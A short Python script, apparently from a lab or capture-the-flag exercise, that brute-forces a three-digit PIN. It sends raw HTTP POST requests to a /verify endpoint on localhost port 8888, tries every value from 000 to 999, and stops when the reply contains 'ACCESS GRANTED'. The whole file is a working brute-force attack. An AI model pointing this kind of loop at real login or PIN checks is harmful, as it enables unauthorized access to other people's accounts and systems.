import socket
import time

def clientRequest(nums):
    host = "127.0.0.1"
    port = 8888
    method = "POST"
    path = "/verify"
    pins = f"magicNumber={nums:03d}"
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        # print(client_socket)
        client_socket.connect((host,port))
        
        request = (f"{method} {path} HTTP/1.1\r\n"
                   f"Host: {host}:{port}\r\n"
                   f"Content-Type: application/x-www-form-urlencoded\r\n"
                   f"Accept: */*\r\n"
                   f"Accept-Encoding: gzip, deflate br \r\n"
                   f"Connection: close\r\n"
                   f"Content-Length: {len(pins)}\r\n"
                   f"\r\n"
                   f"{pins}\r\n")
        client_socket.sendall((request).encode())

        response = b""
        while True:
            message = client_socket.recv(4096)
            if not message:
                break
            response += message
        print(response.decode())
        client_socket.close()
        return response.decode()
        
    

def pinenter():
    for nums in range(0, 1000):
        message = clientRequest(nums)
        if "ACCESS GRANTED" in message.upper():
            print(f"Successful! {nums:03d}")
            break
        
        else:
            print(f"try again{nums:03d}")
            time.sleep(1)


if __name__ == "__main__":
    pinenter()